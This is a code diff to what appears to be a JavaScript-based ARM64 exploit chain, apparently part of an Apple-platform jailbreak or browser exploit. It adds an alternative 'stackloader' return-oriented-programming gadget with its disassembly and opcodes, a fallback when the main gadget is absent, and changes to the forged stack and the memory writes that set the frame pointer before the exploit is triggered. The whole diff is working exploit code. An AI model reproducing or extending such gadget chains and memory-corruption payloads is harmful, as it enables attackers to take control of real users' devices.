@@ -172,6 +172,16 @@
         // 0x18098e2c0      ffc30191       add sp, sp, 0x70
         // 0x18098e2c4      c0035fd6       ret
 
+        // alt stackloader:
+        // 0x1811b4aa4      bf4301d1       sub sp, x29, 0x50
+        // 0x1811b4aa8      fd7b45a9       ldp x29, x30, [sp, 0x50]
+        // 0x1811b4aac      f44f44a9       ldp x20, x19, [sp, 0x40]
+        // 0x1811b4ab0      f65743a9       ldp x22, x21, [sp, 0x30]
+        // 0x1811b4ab4      f85f42a9       ldp x24, x23, [sp, 0x20]
+        // 0x1811b4ab8      fa6741a9       ldp x26, x25, [sp, 0x10]
+        // 0x1811b4abc      fc6fc6a8       ldp x28, x27, [sp], 0x60
+        // 0x1811b4ac0      c0035fd6       ret
+
         // __longjmp:
         // 0x180700ad4      135040a9       ldp x19, x20, [x0]
         // 0x180700ad8      155841a9       ldp x21, x22, [x0, 0x10]
@@ -248,6 +258,9 @@
                 // ldp x29, x30, [sp, 0x60]; ldp x20, x19, [sp, 0x50]; ldp x22, x21, [sp, 0x40]; ldp x24, x23, [sp, 0x30];
                 // ldp x26, x25, [sp, 0x20]; ldp x28, x27, [sp, 0x10]; add sp, sp, 0x70; ret
                 "stackloader": [ 0xa9467bfd, 0xa9454ff4, 0xa94457f6, 0xa9435ff8, 0xa94267fa, 0xa9416ffc, 0x9101c3ff, 0xd65f03c0 ],
+                // sub sp, x29, 0x50; ldp x29, x30, [sp, 0x50]; ldp x20, x19, [sp, 0x40]; ldp x22, x21, [sp, 0x30];
+                // ldp x24, x23, [sp, 0x20]; ldp x26, x25, [sp, 0x10]; ldp x28, x27, [sp], 0x60; ret
+                "altstackloader": [ 0xd10143bf, 0xa9457bfd, 0xa9444ff4, 0xa94357f6, 0xa9425ff8, 0xa94167fa, 0xa8c66ffc, 0xd65f03c0 ]
             };
 
             opcode_libs = [ "/usr/lib/libLLVM.dylib" ];
@@ -390,7 +403,12 @@
         {
             gadgets['dispatch'] = gadgets['altdispatch'];
         }
+        if(!gadgets['stackloader'])
+        {
+            gadgets['stackloader'] = gadgets['altstackloader'];
+        }
         delete opcodes['altdispatch'];
+        delete opcodes['altstackloader'];
         var k = Object.values(libs).reduce(function(p,c){ c.forEach(function(e){ p.push(e) });return p; }, []);
         for(var i = 0; i < k.length; ++i)
         {
@@ -568,8 +586,8 @@
             arr[pos++] = 0xdead001a;                // x19 (unused)
             arr[pos++] = 0xdead001b;                // x19 (unused)
             var tmppos = pos;
-            arr[pos++] = Add(stack, tmppos*4).lo(); // x29 (unused)
-            arr[pos++] = Add(stack, tmppos*4).hi(); // x29 (unused)
+            arr[pos++] = Add(stack, tmppos*4 + 0x40).lo(); // x29
+            arr[pos++] = Add(stack, tmppos*4 + 0x40).hi(); // x29
             arr[pos++] = regloader.lo();            // x30 (first gadget)
             arr[pos++] = regloader.hi();            // x30 (first gadget)
 
@@ -787,6 +805,7 @@
         }
 
         var sp = Add(stack, (arrsz - off) * 4);
+        memory.writeInt64(Add(el_addr, 0x60), Add(sp, 0x60));      // x29
         memory.writeInt64(Add(el_addr, 0x68), sp);      // x2 (copied into sp)
 
         // trigger
